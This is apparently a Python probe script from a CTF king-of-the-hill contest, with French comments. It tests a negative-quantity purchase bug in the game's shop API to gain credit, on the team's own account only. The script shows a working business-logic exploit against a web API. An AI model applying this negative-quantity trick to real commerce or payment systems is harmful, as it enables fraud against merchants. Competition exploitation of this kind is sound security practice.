#!/usr/bin/env python3
"""
NCTF26 KOTH — Reseau Fortune : PROBE ciblé (peu de requêtes, espacées).

Teste UNE hypothèse : achat à quantité négative => "dépense" négative => crédit.
Si net_gain monte, on tient le générateur et il suffira d'UNE requête à grande
quantité pour passer en tête (pas de boucle, pas de flood).

Règle : on ne touche qu'à NOTRE compte. Pas de transfert pour voler d'autres
équipes.
"""
import json, time, urllib.request, urllib.error
from http.cookiejar import CookieJar

HOST  = "http://13.37.197.230:28493"
TOKEN = "6eefff4072981996"
PAUSE = 8

cj = CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def call(path, body=None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(HOST + path, data=data,
                                 headers={"Content-Type": "application/json"},
                                 method="POST" if body is not None else "GET")
    try:
        with opener.open(req, timeout=6) as r:
            txt = r.read().decode(errors="replace")
            print(f"  {path} -> {r.status} {txt[:300]}")
            try: return json.loads(txt)
            except Exception: return {}
    except urllib.error.HTTPError as e:
        print(f"  {path} -> {e.code} {e.read().decode(errors='replace')[:300]}")
    except Exception as e:
        print(f"  {path} -> erreur {e}")
    return {}

print("1) join");                 call("/api/join", {"token": TOKEN}); time.sleep(PAUSE)
print("2) baseline");             call("/api/me");                     time.sleep(PAUSE)
print("3) achat qty = -1 (test quantité négative)")
call("/api/buy", {"product": "booster", "qty": -1});                   time.sleep(PAUSE)
print("4) état après")
call("/api/me")
print("\n-> Colle la sortie. Si wallet/net_gain ont AUGMENTÉ, on tient le bug.")
